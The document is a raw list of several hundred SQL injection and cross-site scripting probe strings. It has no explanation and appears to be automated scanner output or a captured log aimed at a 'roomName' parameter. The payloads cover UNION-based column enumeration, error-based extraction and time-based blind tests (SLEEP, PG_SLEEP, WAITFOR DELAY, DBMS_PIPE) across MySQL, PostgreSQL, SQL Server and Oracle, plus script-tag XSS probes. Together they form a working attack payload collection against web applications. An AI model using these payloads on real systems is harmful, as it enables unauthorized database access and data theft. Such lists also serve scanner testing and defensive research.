1) UNION ALL SELECT NULL,NULL,NULL,NULL,CONCAT(0x71626a7a71,0x4c5a4375434d586c6f48,0x716b767071),NULL,NULL#
1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- iduR
1 ����%2527%2522
roomName
1 UNION ALL SELECT NULL-- xPNV
1' UNION ALL SELECT NULL,NULL,NULL,NULL-- YkQL
1 ORDER BY 8291-- VcRK
-7134) UNION ALL SELECT NULL,NULL,CONCAT(0x71626a7a71,0x7a6970694a5a48456174,0x716b767071),NULL,NULL,NULL,NULL#
1');SELECT PG_SLEEP(5)--
roomName' RLIKE (SELECT (CASE WHEN (390=390) THEN 1 ELSE 0x28 END)) -- 
-1 OR 2+970-970-1=0+0+0+1
1 waitfor delay '0:0:15' -- 
1' AND (SELECT 8736 FROM(SELECT COUNT(*),CONCAT(0x71626a7a71,(SELECT (ELT(8736=8736,1))),0x716b767071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND 'AXBm'='AXBm
1%';SELECT PG_SLEEP(5)--
roomName%' AND 2*3*8=6*8 AND '5Ukf'!='5Ukf%
3ermCoKp')) OR 456=(SELECT 456 FROM PG_SLEEP(15))--
kDXJepLC')) OR 602=(SELECT 602 FROM PG_SLEEP(15))--
1) UNION ALL SELECT 84,84,84,84,CONCAT(0x71626a7a71,0x516f464e537376524b464146676564716a487476687a5a705a774a7559786d425151484644717843,0x716b767071),84,84#
if(now()=sysdate(),sleep(15),0)
1) UNION ALL SELECT NULL,NULL,CONCAT(0x71626a7a71,0x674c4965727275644a42,0x716b767071),NULL,NULL,NULL,NULL#
1) ORDER BY 1#
1%' UNION ALL SELECT NULL-- YEmt
1) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x71626a7a71,0x5a775362724544414e59,0x716b767071)#
1 AND 1697=3859
1 AND 3475=CAST((CHR(113)||CHR(98)||CHR(106)||CHR(122)||CHR(113))||(SELECT (CASE WHEN (3475=3475) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(107)||CHR(118)||CHR(112)||CHR(113)) AS NUMERIC)
1') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
-6303) UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x71626a7a71,0x4c7559706776524b43595856626e4a454153714a634d4e456b5243587a79715a4e52747943535171,0x716b767071),NULL,NULL,NULL#
1) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- ZJho
@@tQpVX
1') AND (SELECT 8736 FROM(SELECT COUNT(*),CONCAT(0x71626a7a71,(SELECT (ELT(8736=8736,1))),0x716b767071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND ('ZfJx'='ZfJx
vfGkQdSQ' OR 525=(SELECT 525 FROM PG_SLEEP(15))--
1') UNION ALL SELECT NULL#
1 AND 5484=5484
1) ORDER BY 6069#
'&quot;()&amp;%<acx><ScRiPt >ANRV(9919)</ScRiPt>
wrBEIRqX9320805
1) UNION ALL SELECT 84,84,84,CONCAT(0x71626a7a71,0x70725a666c754458766d4a79585455786e66586b61586f63636a646f5a6d5a70434f45744c4a5a6a,0x716b767071),84,84,84#
1') UNION ALL SELECT NULL,NULL,NULL#
1 AND 1883=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(98)||CHR(106)||CHR(122)||CHR(113)||(SELECT (CASE WHEN (1883=1883) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(107)||CHR(118)||CHR(112)||CHR(113)||CHR(62))) FROM DUAL)
1') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
1 AND (SELECT 8736 FROM(SELECT COUNT(*),CONCAT(0x71626a7a71,(SELECT (ELT(8736=8736,1))),0x716b767071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)-- LYlf
1) UNION ALL SELECT 84,84,84,CONCAT(0x71626a7a71,0x476d794c657459476876,0x716b767071),84,84,84#
1) UNION ALL SELECT CONCAT(0x71626a7a71,0x57486857587246726a6e,0x716b767071),NULL,NULL,NULL,NULL,NULL,NULL#
1) UNION ALL SELECT NULL#
1%' ORDER BY 1#
14axyP8M'
ZMskyuza'||'
1') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL#
1%' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
1 UNION ALL SELECT NULL,NULL,NULL-- YVEW
1') UNION ALL SELECT NULL-- MNDJ
-1 OR 2+456-456-1=0+0+0+1
1');WAITFOR DELAY '0:0:5'--
1) AND 3475=CAST((CHR(113)||CHR(98)||CHR(106)||CHR(122)||CHR(113))||(SELECT (CASE WHEN (3475=3475) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(107)||CHR(118)||CHR(112)||CHR(113)) AS NUMERIC) AND (3016=3016
-8531) UNION ALL SELECT 84,84,84,CONCAT(0x71626a7a71,0x584c56434a626353486d41525047496e5a715945627a447951446a55687877624d5466734f496170,0x716b767071),84,84,84#
1);WAITFOR DELAY '0:0:5'--
1
b8YtBRUh
1 AND 3475=CAST((CHR(113)||CHR(98)||CHR(106)||CHR(122)||CHR(113))||(SELECT (CASE WHEN (3475=3475) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(107)||CHR(118)||CHR(112)||CHR(113)) AS NUMERIC)-- BNNL
1 ORDER BY 1-- gGgz
1 UNION ALL SELECT NULL,NULL,NULL,NULL#
1) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL-- epNn
1%';WAITFOR DELAY '0:0:5'--
1' AND 2649=CONVERT(INT,(SELECT CHAR(113)+CHAR(98)+CHAR(106)+CHAR(122)+CHAR(113)+(SELECT (CASE WHEN (2649=2649) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(107)+CHAR(118)+CHAR(112)+CHAR(113))) AND 'HaEX'='HaEX
1) UNION ALL SELECT CONCAT(0x71626a7a71,0x56545969686a527a624e,0x716b767071),84,84,84,84,84,84#
1' AND 5484=5484 AND 'rtNY'='rtNY
1') AND 1883=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(98)||CHR(106)||CHR(122)||CHR(113)||(SELECT (CASE WHEN (1883=1883) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(107)||CHR(118)||CHR(112)||CHR(113)||CHR(62))) FROM DUAL) AND ('fXnT'='fXnT
1') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL#
1()''(..&quot;.'
@@Sk7s5
1) UNION ALL SELECT 84,84,84,84,84,CONCAT(0x71626a7a71,0x6a734c69676865586659,0x716b767071),84#
1) ORDER BY 6493-- TqNZ
1) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL-- iRGa
1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL-- pSnJ
1) UNION ALL SELECT 84,84,84,84,CONCAT(0x71626a7a71,0x7551696b665476557066,0x716b767071),84,84#
1) UNION ALL SELECT 84,84,CONCAT(0x71626a7a71,0x79545942664b62494f5a78564a4643716e726e65684a694d4c506641504e665970765562685a4153,0x716b767071),84,84,84,84#
1%' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
-1 OR 3+970-970-1=0+0+0+1
1) UNION ALL SELECT NULL,NULL,CONCAT(0x71626a7a71,0x514b69714f7a7570735373637150646e6f6773466e785a444a484850734e544e696c5764694c7773,0x716b767071),NULL,NULL,NULL,NULL#
(SELECT (CASE WHEN (8286=8286) THEN 8286 ELSE 8286*(SELECT 8286 FROM INFORMATION_SCHEMA.CHARACTER_SETS) END))
roomName'||'
1) UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x71626a7a71,0x75726d73544954504c77,0x716b767071),NULL,NULL,NULL#
(SELECT CHAR(113)+CHAR(98)+CHAR(106)+CHAR(122)+CHAR(113)+(SELECT (CASE WHEN (1011=1011) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(107)+CHAR(118)+CHAR(112)+CHAR(113))
1) AND (SELECT 8736 FROM(SELECT COUNT(*),CONCAT(0x71626a7a71,(SELECT (ELT(8736=8736,1))),0x716b767071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND (3239=3239
1 ORDER BY 1#
-1186) UNION ALL SELECT 84,CONCAT(0x71626a7a71,0x5270676c576b494a714e59697a4a4b6a706b4d58455747735546765959746544526c714857447178,0x716b767071),84,84,84,84,84#
1) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x71626a7a71,0x76707448566d7350647a6a4b6771446953626778426454754d7259465856566a6650667048674b59,0x716b767071)#
1%' UNION ALL SELECT NULL,NULL,NULL,NULL#
1 ORDER BY 4128-- bWMM
-1317) UNION ALL SELECT 84,84,84,84,84,84,CONCAT(0x71626a7a71,0x764e7a4e47456a7a77517049456151444b6c696346716943706d6a746e4e57446868594b50517068,0x716b767071)#
1);SELECT DBMS_PIPE.RECEIVE_MESSAGE(CHR(108)||CHR(77)||CHR(78)||CHR(116),5) FROM DUAL--
1dRrFNpAO
1 AND 4263=DBMS_PIPE.RECEIVE_MESSAGE(CHR(109)||CHR(103)||CHR(102)||CHR(101),5)
1%' AND 3475=CAST((CHR(113)||CHR(98)||CHR(106)||CHR(122)||CHR(113))||(SELECT (CASE WHEN (3475=3475) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(107)||CHR(118)||CHR(112)||CHR(113)) AS NUMERIC) AND '%'='
7138
roomName&quot; AND 2*3*8=6*8 AND &quot;wsGr&quot;=&quot;wsGr
1') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
1 AND 5484=5484-- QLNN
1') AND SLEEP(5) AND ('CycD'='CycD
1 AND 2649=CONVERT(INT,(SELECT CHAR(113)+CHAR(98)+CHAR(106)+CHAR(122)+CHAR(113)+(SELECT (CASE WHEN (2649=2649) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(107)+CHAR(118)+CHAR(112)+CHAR(113)))-- zUWv
1'&quot;
1%' AND 1297=4891 AND '%'='
-7859) UNION ALL SELECT 84,84,CONCAT(0x71626a7a71,0x736d4b47696576637475,0x716b767071),84,84,84,84#
1) UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x71626a7a71,0x6a485161686b786f43544f7258534362725747544d6f754777506c644f5877587350446d4d5a4649,0x716b767071),NULL,NULL,NULL#
1 UNION ALL SELECT NULL,NULL,NULL,NULL-- LiiF
1) UNION ALL SELECT CONCAT(0x71626a7a71,0x4d42517271554d437a4946645650617a506f43575875557750427556536a674b6953456858706c61,0x716b767071),84,84,84,84,84,84#
1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL#
1);SELECT SLEEP(5)#
nzbdOVb6
wrBEIRqX'||DBMS_PIPE.RECEIVE_MESSAGE(CHR(98)||CHR(98)||CHR(98),15)||'
wrBEIRqX' AND 2*3*8=6*8 AND 'mEZy'='mEZy
1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL#
1') ORDER BY 7678-- ULSz
lS7YI22j
1) AND 5202=2985 AND (6694=6694
1';SELECT PG_SLEEP(5)--
1;WAITFOR DELAY '0:0:5'--
1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL-- XhkD
1) UNION ALL SELECT CONCAT(0x71626a7a71,0x75747443564170567275575768636e67755a695075707675656a554247546147414470476f69434a,0x716b767071),NULL,NULL,NULL,NULL,NULL,NULL#
1) AND SLEEP(5) AND (3268=3268
1%' UNION ALL SELECT NULL,NULL,NULL,NULL-- ztgR
ZMskyuza'||DBMS_PIPE.RECEIVE_MESSAGE(CHR(98)||CHR(98)||CHR(98),15)||'
1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL-- vPIR
jQEIMpjz'
idRYCgFU') OR 452=(SELECT 452 FROM PG_SLEEP(15))--
1';SELECT DBMS_PIPE.RECEIVE_MESSAGE(CHR(108)||CHR(77)||CHR(78)||CHR(116),5) FROM DUAL--
roomName' AND 2*3*8=6*8 AND 'Xa1K'='Xa1K
wrBEIRqX9184245
1 AND SLEEP(5)-- BVJC
1') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL-- ZvEV
1) UNION ALL SELECT NULL,CONCAT(0x71626a7a71,0x48776363626c666b617a,0x716b767071),NULL,NULL,NULL,NULL,NULL#
1') UNION ALL SELECT NULL,NULL,NULL-- Pqht
1) UNION ALL SELECT 84,84,84,84,84,84,CONCAT(0x71626a7a71,0x6e616b6f506463436843,0x716b767071)#
1) WAITFOR DELAY '0:0:5' AND (8038=8038
1%' AND (SELECT 8736 FROM(SELECT COUNT(*),CONCAT(0x71626a7a71,(SELECT (ELT(8736=8736,1))),0x716b767071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND '%'='
1%' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL-- gfnN
1') AND 4713=(SELECT 4713 FROM PG_SLEEP(5)) AND ('FAgj'='FAgj
ZMskyuza&quot; AND 2*3*8=6*8 AND &quot;wNPF&quot;=&quot;wNPF
ai
1%' AND 4263=DBMS_PIPE.RECEIVE_MESSAGE(CHR(109)||CHR(103)||CHR(102)||CHR(101),5) AND '%'='
-7250) UNION ALL SELECT 84,84,84,84,CONCAT(0x71626a7a71,0x48666e49546f787379625a725a494b745352704b5a746377636163586e636668684e6e637a5a7765,0x716b767071),84,84#
-1 OR 3+183-183-1=0+0+0+1
-1 OR 3+694-694-1=0+0+0+1
1) UNION ALL SELECT NULL,CONCAT(0x71626a7a71,0x6d74754f5475586c696656655a444369746a41664d69596a4e664e624b5452547054634d72537a42,0x716b767071),NULL,NULL,NULL,NULL,NULL#
(SELECT CONCAT(0x71626a7a71,(SELECT (ELT(2675=2675,1))),0x716b767071))
1);SELECT PG_SLEEP(5)--
1) UNION ALL SELECT 84,CONCAT(0x71626a7a71,0x67477a71754e52627778534d63507669635046575a61476146414c786f7652524858784f52584578,0x716b767071),84,84,84,84,84#
-3552) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,CONCAT(0x71626a7a71,0x496e5045486a4b415871,0x716b767071),NULL#
1) UNION ALL SELECT 84,CONCAT(0x71626a7a71,0x77586677566b6f526f69,0x716b767071),84,84,84,84,84#
1' AND 1883=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(98)||CHR(106)||CHR(122)||CHR(113)||(SELECT (CASE WHEN (1883=1883) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(107)||CHR(118)||CHR(112)||CHR(113)||CHR(62))) FROM DUAL) AND 'EjLc'='EjLc
1%' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- cTPC
1') WAITFOR DELAY '0:0:5' AND ('SxSZ'='SxSZ
d2ouLMWV' OR 403=(SELECT 403 FROM PG_SLEEP(15))--
1) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- KMwn
OVPJOgGS') OR 941=(SELECT 941 FROM PG_SLEEP(15))--
1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- bJCU
1 WAITFOR DELAY '0:0:5'
-3591) UNION ALL SELECT 84,84,84,84,CONCAT(0x71626a7a71,0x6549637a63555142616b,0x716b767071),84,84#
1) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
1) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL#
-8187) UNION ALL SELECT 84,84,CONCAT(0x71626a7a71,0x43796c6c6a59717363524e7254616a7446446e536d796a62524f59454a4a65447147667579475345,0x716b767071),84,84,84,84#
1 ORDER BY 1-- uXyH
1) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL-- VWgQ
1') AND 4263=DBMS_PIPE.RECEIVE_MESSAGE(CHR(109)||CHR(103)||CHR(102)||CHR(101),5) AND ('Qryc'='Qryc
1) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
1 UNION ALL SELECT NULL-- CQSF
1%' AND 1883=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(98)||CHR(106)||CHR(122)||CHR(113)||(SELECT (CASE WHEN (1883=1883) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(107)||CHR(118)||CHR(112)||CHR(113)||CHR(62))) FROM DUAL) AND '%'='
-1184) UNION ALL SELECT 84,84,84,84,84,CONCAT(0x71626a7a71,0x715263564759536d7346,0x716b767071),84#
1%' UNION ALL SELECT NULL,NULL,NULL-- DLaG
W9SK4UDL') OR 655=(SELECT 655 FROM PG_SLEEP(15))--
@@a9I6B
-9021) UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x71626a7a71,0x51595962644e69414754,0x716b767071),NULL,NULL,NULL#
1 AND 1883=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(98)||CHR(106)||CHR(122)||CHR(113)||(SELECT (CASE WHEN (1883=1883) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(107)||CHR(118)||CHR(112)||CHR(113)||CHR(62))) FROM DUAL)-- IbkC
(select(0)from(select(sleep(15)))v)/*'+(select(0)from(select(sleep(15)))v)+'&quot;+(select(0)from(select(sleep(15)))v)+&quot;*/
1' ORDER BY 6174#
1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- eCaH
1) UNION ALL SELECT NULL,NULL-- OMfo
1) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL#
wrBEIRqX'&quot;()&amp;%<acx><ScRiPt >ANRV(9860)</ScRiPt>
-4725) UNION ALL SELECT NULL,CONCAT(0x71626a7a71,0x4d66545961794e677556,0x716b767071),NULL,NULL,NULL,NULL,NULL#
1) UNION ALL SELECT NULL,NULL,NULL,NULL#
ZMskyuza' AND 2*3*8=6*8 AND 'sELl'='sELl
(SELECT 3524 FROM(SELECT COUNT(*),CONCAT(0x71626a7a71,(SELECT (ELT(3524=3524,1))),0x716b767071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
1;SELECT PG_SLEEP(5)--
1) AND 5484=5484 AND (8176=8176
1' WAITFOR DELAY '0:0:5' AND 'qHoJ'='qHoJ
wrBEIRqX%' AND 2*3*8=6*8 AND 'PH7N'!='PH7N%
1 WAITFOR DELAY '0:0:5'-- jCMh
1') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- TyHM
-6239) UNION ALL SELECT 84,84,84,84,84,84,CONCAT(0x71626a7a71,0x4c706b78756b44506a62,0x716b767071)#
@@0qAKt
1') UNION ALL SELECT NULL,NULL,NULL,NULL#
1') UNION ALL SELECT NULL,NULL-- rfMp
1) UNION ALL SELECT 84,84,84,84,84,84,CONCAT(0x71626a7a71,0x6259557669665848756e686b73616579676c7654554a4f5a57624f5a447459625a445a5156794a7a,0x716b767071)#
1) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,CONCAT(0x71626a7a71,0x6b704d746b4241434d7a72697343576c52735372787563617a6a6c4e504a7273534a447445645365,0x716b767071),NULL#
pD77XZgu'; waitfor delay '0:0:15' -- 
'&quot;()&amp;%<acx><ScRiPt >nrJK(9460)</ScRiPt>
38cXhYPe'; waitfor delay '0:0:15' -- 
1;SELECT DBMS_PIPE.RECEIVE_MESSAGE(CHR(108)||CHR(77)||CHR(78)||CHR(116),5) FROM DUAL--
1%' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL#
1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
1) UNION ALL SELECT NULL-- TBEj
1) AND 2649=CONVERT(INT,(SELECT CHAR(113)+CHAR(98)+CHAR(106)+CHAR(122)+CHAR(113)+(SELECT (CASE WHEN (2649=2649) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(107)+CHAR(118)+CHAR(112)+CHAR(113))) AND (9400=9400
1%' WAITFOR DELAY '0:0:5' AND '%'='
1) UNION ALL SELECT NULL,NULL#
1') AND 6919=2043 AND ('uOqr'='uOqr
-1 OR 2+183-183-1=0+0+0+1
1%' UNION ALL SELECT NULL,NULL,NULL#
1 AND SLEEP(5)
1) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,CONCAT(0x71626a7a71,0x4f51745246466a425744,0x716b767071),NULL#
4hUZpeUY') OR 952=(SELECT 952 FROM PG_SLEEP(15))--
1 AND 4263=DBMS_PIPE.RECEIVE_MESSAGE(CHR(109)||CHR(103)||CHR(102)||CHR(101),5)-- HoJA
1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
xpHFE4WW')) OR 992=(SELECT 992 FROM PG_SLEEP(15))--
1%' UNION ALL SELECT NULL#
1) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL#
1');SELECT SLEEP(5)#
1' ORDER BY 1-- uSpj
1' UNION ALL SELECT NULL,NULL,NULL#
1) AND 1883=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(98)||CHR(106)||CHR(122)||CHR(113)||(SELECT (CASE WHEN (1883=1883) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(107)||CHR(118)||CHR(112)||CHR(113)||CHR(62))) FROM DUAL) AND (8678=8678
1%' ORDER BY 7537-- nvdt
ZMskyuza%' AND 2*3*8=6*8 AND 'CPCD'!='CPCD%
1%';SELECT DBMS_PIPE.RECEIVE_MESSAGE(CHR(108)||CHR(77)||CHR(78)||CHR(116),5) FROM DUAL--
1 ORDER BY 4399#
-1330) UNION ALL SELECT 84,84,84,84,84,CONCAT(0x71626a7a71,0x5a6e7766597074614852724c6c506e535374504d4a445365564e5857597478726e77635651586e51,0x716b767071),84#
-6360) UNION ALL SELECT NULL,NULL,NULL,NULL,CONCAT(0x71626a7a71,0x4b63706471687967445859567a596b67716e42784b6264515764726347505245484951626f715158,0x716b767071),NULL,NULL#
1) UNION ALL SELECT NULL,NULL,NULL-- Ekou
1' AND 4263=DBMS_PIPE.RECEIVE_MESSAGE(CHR(109)||CHR(103)||CHR(102)||CHR(101),5) AND 'MQHR'='MQHR
1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
1) UNION ALL SELECT 84,84,CONCAT(0x71626a7a71,0x6963704a657245786251,0x716b767071),84,84,84,84#
OZvdt3b6' OR 440=(SELECT 440 FROM PG_SLEEP(15))--
-1 OR 2+694-694-1=0+0+0+1
roomName%' AND 2*3*8=6*8 AND 'Yd5V'!='Yd5V%
1) UNION ALL SELECT NULL,NULL,NULL,NULL-- VrfR
wrBEIRqX
1' ORDER BY 1#
1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- FWBU
1) ORDER BY 1-- LSYw
1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- Qahd
1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- BeKj
1') UNION ALL SELECT NULL,NULL,NULL,NULL-- rFSc
-3635) UNION ALL SELECT 84,CONCAT(0x71626a7a71,0x784e4f6b546973794b7a,0x716b767071),84,84,84,84,84#
wrBEIRqX'||'
1yd4r3l8O
wrBEIRqX' RLIKE (SELECT (CASE WHEN (767=767) THEN 1 ELSE 0x28 END)) -- 
1 AND 4713=(SELECT 4713 FROM PG_SLEEP(5))
1'ybxvuU<'&quot;>iKxVhF
1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL-- ygut
1%' ORDER BY 1-- JeJc
-1 OR 3+456-456-1=0+0+0+1
-3182) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,CONCAT(0x71626a7a71,0x76526c4c514e4c72456a497a58644f69724f4659636375664e4c6252596e5268435a44626e4b6967,0x716b767071),NULL#
-7939) UNION ALL SELECT CONCAT(0x71626a7a71,0x4f67526550496465696c446f436a7a4e556e48444e6f66765a797769507744416265527646576442,0x716b767071),NULL,NULL,NULL,NULL,NULL,NULL#
Cnq1sxn6')) OR 326=(SELECT 326 FROM PG_SLEEP(15))--
1) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- Eqax
roomName&quot; AND 2*3*8=6*8 AND &quot;NL3z&quot;=&quot;NL3z
1 AND 2649=CONVERT(INT,(SELECT CHAR(113)+CHAR(98)+CHAR(106)+CHAR(122)+CHAR(113)+(SELECT (CASE WHEN (2649=2649) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(107)+CHAR(118)+CHAR(112)+CHAR(113)))
1) UNION ALL SELECT NULL,NULL,NULL,NULL,CONCAT(0x71626a7a71,0x5153504572627a4b4375774f4a6861514a7778517567685a7a427271796b5477477059764c74755a,0x716b767071),NULL,NULL#
1 UNION ALL SELECT NULL,NULL,NULL-- Gdor
1 UNION ALL SELECT NULL,NULL#
roomName'||DBMS_PIPE.RECEIVE_MESSAGE(CHR(98)||CHR(98)||CHR(98),15)||'
1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL-- IRxO
-4257) UNION ALL SELECT NULL,NULL,NULL,NULL,CONCAT(0x71626a7a71,0x5a56494c70464b587453,0x716b767071),NULL,NULL#
1 AND (SELECT 8736 FROM(SELECT COUNT(*),CONCAT(0x71626a7a71,(SELECT (ELT(8736=8736,1))),0x716b767071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL-- oBAE
ZMskyuza
1') ORDER BY 1-- Cgxv
(SELECT (CHR(113)||CHR(98)||CHR(106)||CHR(122)||CHR(113))||(SELECT (CASE WHEN (1627=1627) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(107)||CHR(118)||CHR(112)||CHR(113)))
1') ORDER BY 1088#
1' AND 3934=5158 AND 'vqcg'='vqcg
1%' UNION ALL SELECT NULL,NULL#
1 AND 4713=(SELECT 4713 FROM PG_SLEEP(5))-- aDYj
-2385) UNION ALL SELECT CONCAT(0x71626a7a71,0x4e4153736d6d446b4978,0x716b767071),NULL,NULL,NULL,NULL,NULL,NULL#
1');SELECT DBMS_PIPE.RECEIVE_MESSAGE(CHR(108)||CHR(77)||CHR(78)||CHR(116),5) FROM DUAL--
1 UNION ALL SELECT NULL,NULL-- hWHI
1' ORDER BY 5527-- RtgZ
1' UNION ALL SELECT NULL#
1') ORDER BY 1#
1;SELECT SLEEP(5)#
-2218) UNION ALL SELECT 84,84,84,CONCAT(0x71626a7a71,0x4f696563506772457174,0x716b767071),84,84,84#
1%' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- lZCq
1' AND 3475=CAST((CHR(113)||CHR(98)||CHR(106)||CHR(122)||CHR(113))||(SELECT (CASE WHEN (3475=3475) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(107)||CHR(118)||CHR(112)||CHR(113)) AS NUMERIC) AND 'VmGf'='VmGf
1 UNION ALL SELECT NULL,NULL,NULL,NULL-- Ttym
wrBEIRqX'&quot;()&amp;%<acx><ScRiPt >nrJK(9039)</ScRiPt>
1) UNION ALL SELECT NULL,NULL,NULL#
-8100) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x71626a7a71,0x7572524866586e4a65434d6c51424355464d76616a59696e4d526146506f74647777585668715050,0x716b767071)#
roomName' AND 2*3*8=6*8 AND 'flkw'='flkw
(SELECT (CASE WHEN (2646=4989) THEN 2646 ELSE 2646*(SELECT 2646 FROM INFORMATION_SCHEMA.CHARACTER_SETS) END))
1' UNION ALL SELECT NULL,NULL#
1' AND SLEEP(5) AND 'IEBY'='IEBY
1%' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL-- vzHW
1') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- KRVX
1%' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- rzDE
1') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL-- cQUz
1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL-- BycO
mvOISYtD
1 UNION ALL SELECT NULL,NULL-- CseT
1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- puZd
-4511) UNION ALL SELECT CONCAT(0x71626a7a71,0x684c5347625a43665a72,0x716b767071),84,84,84,84,84,84#
1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL-- yCEz
1') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL#
-3865) UNION ALL SELECT NULL,NULL,CONCAT(0x71626a7a71,0x53726e586e566c4c5561534470485865554847537242536a484d61416163797669414569666b7251,0x716b767071),NULL,NULL,NULL,NULL#
1%';SELECT SLEEP(5)#
0'XOR(if(now()=sysdate(),sleep(15),0))XOR'Z
1%' AND 4713=(SELECT 4713 FROM PG_SLEEP(5)) AND '%'='
1) AND 4713=(SELECT 4713 FROM PG_SLEEP(5)) AND (4583=4583
